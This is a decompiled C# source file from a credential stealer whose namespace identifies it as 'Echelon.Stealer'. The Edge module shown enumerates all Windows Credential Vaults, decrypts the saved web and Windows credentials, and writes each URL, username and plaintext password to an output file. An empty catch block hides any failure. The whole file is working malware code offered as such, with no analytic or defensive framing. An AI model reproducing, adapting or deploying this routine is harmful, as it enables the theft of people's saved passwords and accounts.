using System;
using System.Collections.Generic;
using System.Reflection;
using System.Runtime.InteropServices;

namespace Echelon.Stealer.Browsers.Edge
{
	// Token: 0x0200003D RID: 61
	internal class Edge
	{
		// Token: 0x06000172 RID: 370 RVA: 0x0000B840 File Offset: 0x00009A40
		public static void GetEdge(string Passwords)
		{
			try
			{
				DesktopWriter.SetDirectory(Passwords);
				Version version = Environment.OSVersion.Version;
				int major = version.Major;
				int minor = version.Minor;
				int num = 0;
				IntPtr zero = IntPtr.Zero;
				int num2 = VaultCli.VaultEnumerateVaults(0, ref num, ref zero);
				if (num2 != 0)
				{
					DesktopWriter.WriteLine(string.Format("[ERROR] Unable to enumerate vaults. Error (0x" + num2.ToString() + ")", new object[0]));
				}
				IntPtr ptr = zero;
				Dictionary<Guid, string> dictionary = new Dictionary<Guid, string>
				{
					{
						new Guid("2F1A6504-0641-44CF-8BB5-3612D865F2E5"),
						"Windows Secure Note"
					},
					{
						new Guid("3CCD5499-87A8-4B10-A215-608888DD3B55"),
						"Windows Web Password Credential"
					},
					{
						new Guid("154E23D0-C644-4E6F-8CE6-5069272F999F"),
						"Windows Credential Picker Protector"
					},
					{
						new Guid("4BF4C442-9B8A-41A0-B380-DD4A704DDB28"),
						"Web Credentials"
					},
					{
						new Guid("77BC582B-F0A6-4E15-4E80-61736B6F3B29"),
						"Windows Credentials"
					},
					{
						new Guid("E69D7838-91B5-4FC9-89D5-230D4D4CC2BC"),
						"Windows Domain Certificate Credential"
					},
					{
						new Guid("3E0E35BE-1B77-43E7-B873-AED901B6275B"),
						"Windows Domain Password Credential"
					},
					{
						new Guid("3C886FF3-2669-4AA2-A8FB-3F6759A77548"),
						"Windows Extended Credential"
					},
					{
						new Guid("00000000-0000-0000-0000-000000000000"),
						null
					}
				};
				for (int i = 0; i < num; i++)
				{
					object obj = Marshal.PtrToStructure(ptr, typeof(Guid));
					Guid key = new Guid(obj.ToString());
					ptr = (IntPtr)(ptr.ToInt64() + (long)Marshal.SizeOf(typeof(Guid)));
					IntPtr zero2 = IntPtr.Zero;
					string str = dictionary.ContainsKey(key) ? dictionary[key] : key.ToString();
					num2 = VaultCli.VaultOpenVault(ref key, 0u, ref zero2);
					if (num2 != 0)
					{
						DesktopWriter.WriteLine(string.Format("Unable to open the following vault: " + str + ". Error: 0x" + num2.ToString(), new object[0]));
					}
					int num3 = 0;
					IntPtr zero3 = IntPtr.Zero;
					num2 = VaultCli.VaultEnumerateItems(zero2, 512, ref num3, ref zero3);
					if (num2 != 0)
					{
						DesktopWriter.WriteLine(string.Format("[ERROR] Unable to enumerate vault items from the following vault: " + str + ". Error 0x" + num2.ToString(), new object[0]));
					}
					IntPtr ptr2 = zero3;
					if (num3 > 0)
					{
						for (int j = 1; j <= num3; j++)
						{
							Type type = (major >= 6 && minor >= 2) ? typeof(VaultCli.VAULT_ITEM_WIN8) : typeof(VaultCli.VAULT_ITEM_WIN7);
							object obj2 = Marshal.PtrToStructure(ptr2, type);
							ptr2 = (IntPtr)(ptr2.ToInt64() + (long)Marshal.SizeOf(type));
							IntPtr zero4 = IntPtr.Zero;
							FieldInfo field = obj2.GetType().GetField("SchemaId");
							Guid guid = new Guid(field.GetValue(obj2).ToString());
							IntPtr intPtr = (IntPtr)obj2.GetType().GetField("pResourceElement").GetValue(obj2);
							IntPtr intPtr2 = (IntPtr)obj2.GetType().GetField("pIdentityElement").GetValue(obj2);
							ulong num4 = (ulong)obj2.GetType().GetField("LastModified").GetValue(obj2);
							IntPtr intPtr3 = IntPtr.Zero;
							if (major < 6 || minor < 2)
							{
								num2 = VaultCli.VaultGetItem_WIN7(zero2, ref guid, intPtr, intPtr2, IntPtr.Zero, 0, ref zero4);
							}
							else
							{
								intPtr3 = (IntPtr)obj2.GetType().GetField("pPackageSid").GetValue(obj2);
								num2 = VaultCli.VaultGetItem_WIN8(zero2, ref guid, intPtr, intPtr2, intPtr3, IntPtr.Zero, 0, ref zero4);
							}
							if (num2 != 0)
							{
								DesktopWriter.WriteLine(string.Format("Error occured while retrieving vault item. Error: 0x" + num2.ToString(), new object[0]));
							}
							object obj3 = Marshal.PtrToStructure(zero4, type);
							object obj4 = Edge.<GetEdge>g__GetVaultElementValue|1_0((IntPtr)obj3.GetType().GetField("pAuthenticatorElement").GetValue(obj3));
							object obj5 = null;
							if (intPtr3 != IntPtr.Zero)
							{
								obj5 = Edge.<GetEdge>g__GetVaultElementValue|1_0(intPtr3);
							}
							if (obj4 != null)
							{
								object obj6 = Edge.<GetEdge>g__GetVaultElementValue|1_0(intPtr);
								if (obj6 != null)
								{
									DesktopWriter.WriteLine(string.Format("Url: {0}", obj6));
								}
								object obj7 = Edge.<GetEdge>g__GetVaultElementValue|1_0(intPtr2);
								if (obj7 != null)
								{
									DesktopWriter.WriteLine(string.Format("Username: {0}", obj7));
								}
								if (obj5 != null)
								{
									DesktopWriter.WriteLine(string.Format("PacakgeSid: {0}", obj5));
								}
								DesktopWriter.WriteLine(string.Format("Password: {0}\n\n", obj4));
								Edge.count++;
							}
						}
					}
				}
			}
			catch
			{
			}
		}

		// Token: 0x04000084 RID: 132
		public static int count;
	}
}
